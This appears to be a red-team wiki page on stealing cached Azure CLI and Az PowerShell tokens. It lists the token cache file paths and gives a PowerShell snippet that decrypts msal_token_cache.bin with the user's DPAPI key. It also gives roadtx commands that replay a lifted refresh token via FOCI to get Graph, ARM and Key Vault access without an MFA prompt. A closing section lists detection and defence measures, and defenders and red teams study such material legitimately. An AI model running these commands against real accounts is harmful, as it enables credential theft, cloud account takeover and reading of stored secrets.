---
title: Azure CLI token harvesting
slug: az-cli-tokens
---

> **TL;DR:** Azure CLI and Az PowerShell cache MSAL refresh tokens on disk; lift them, replay the refresh token against arbitrary first-party resource URIs, and you get tokens for Graph, ARM, Key Vault, Storage — without re-auth.

## What it is
`az login` and `Connect-AzAccount` store an MSAL token cache under the user profile — historically `~/.azure/accessTokens.json` and `~/.azure/azureProfile.json`, now `~/.azure/msal_token_cache.bin` (DPAPI-wrapped on Windows, plaintext on Linux/macOS by default). The cache holds access tokens, ID tokens, and long-lived refresh tokens. Because Microsoft issues "Family of Client IDs" (FOCI) refresh tokens, a refresh token issued for `az` CLI can be exchanged for an access token bound to any other FOCI client (Teams, Outlook, Edge) and any resource the user consented to.

## Preconditions / where it applies
- Local read access to the target user's profile directory.
- On Windows: ability to run as that user (DPAPI unwrap is per-user) — or the user is a domain user and DC has the DPAPI backup key (`SharpDPAPI`).
- Egress to `login.microsoftonline.com`.

## Technique
**Locations:**
- Windows: `%USERPROFILE%\.azure\msal_token_cache.bin` (+ `.azureProfile.json`, `service_principal_entries.bin`)
- Linux/macOS: `~/.azure/msal_token_cache.bin` (often plaintext) and `~/.azure/msal_http_cache.bin`
- Az PowerShell: `~/.Azure/TokenCache.dat`

**Lift and parse:**

```powershell
# Windows — unwrap with current user's DPAPI key
$enc = [IO.File]::ReadAllBytes("$env:USERPROFILE\.azure\msal_token_cache.bin")
$plain = [Security.Cryptography.ProtectedData]::Unprotect($enc, $null, 'CurrentUser')
[Text.Encoding]::UTF8.GetString($plain)
```

Tools: `TokenTactics`, `ROADtools` (`roadtx`), `AADInternals`. The cache JSON contains `home_account_id`, `client_id`, `target` (scope), `secret` (the refresh token).

**Refresh-token replay across resources:**

```powershell
# get a Graph token from an az-cli refresh token via FOCI
roadtx auth --refresh-token <RT> --client 1950a258-227b-4e31-a9cf-717495945fc2 \
  --resource https://graph.microsoft.com
# same RT → ARM
roadtx auth --refresh-token <RT> --client 04b07795-8ddb-461a-bbee-02f9e1bf7b46 \
  --resource https://management.azure.com
# same RT → Key Vault
roadtx auth --refresh-token <RT> --resource https://vault.azure.net
```

Once you have a Graph access token you can enumerate users/groups/apps; with ARM you read subscriptions; with Key Vault you read secrets — chain into [[azure-key-vault-attacks]] and [[service-principal-abuse]].

**No browser, no MFA prompt:** the refresh token already represents a successfully authenticated session including any MFA performed at issuance.

## Detection and defence
- Sign-in logs: alert on `Azure CLI` (app id `04b07795-...`) sign-ins from new IPs / unusual geos for privileged users.
- Conditional Access: require MFA per-resource and short token lifetimes; bind tokens to device (Continuous Access Evaluation, token protection).
- Disable persistent token cache on shared/jump hosts: `az config set core.enable_broker_on_windows=true` and use Web Account Manager.
- Detect `msal_token_cache.bin` reads by non-Azure-CLI processes (EDR file-access telemetry).
- Roll refresh tokens on compromise — `Revoke-AzureADUserAllRefreshToken` / `Revoke-MgUserSignInSession`.

## References
- [ROADtools — token abuse](https://github.com/dirkjanm/ROADtools) — token cache parsing and replay
- [TokenTactics](https://github.com/rvrsh3ll/TokenTacticsV2) — FOCI refresh-token swaps
- [Microsoft — MSAL token cache](https://learn.microsoft.com/en-us/entra/msal/dotnet/how-to/token-cache-serialization) — cache mechanics

See also: [[oauth-foci-family-of-client-ids-abuse]], [[graphrunner-msgraph-redteam]], [[entra-prt-cookie-theft]], [[entra-device-code-prt-pivot]], [[managed-identities]], [[service-principal-abuse]]
